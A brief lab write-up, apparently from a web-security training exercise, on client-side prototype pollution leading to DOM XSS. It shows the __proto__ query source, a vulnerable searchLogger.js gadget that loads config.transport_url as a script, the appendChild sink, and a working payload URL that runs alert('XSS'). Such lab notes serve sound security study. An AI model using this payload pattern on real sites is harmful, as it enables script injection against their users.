
# 1 brief

execute `alert()`, prototype polluion

---

# 2 source-sink-gadget

source
```
/?__proto__[foo]=bar; >>> positive
```

gadget
```
/resources/js/searchLogger.js

async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};

    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }

    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

---

put debugger to verify config.transport_url >>> undefined
```

DOM sink for xss `alert()`
```
document.body.appendChild(script);
```

---
# end

payload
```
/?__proto__[transport_url]=data:text/javascript,alert('XSS')&search=a
```

[...back](../note.md)
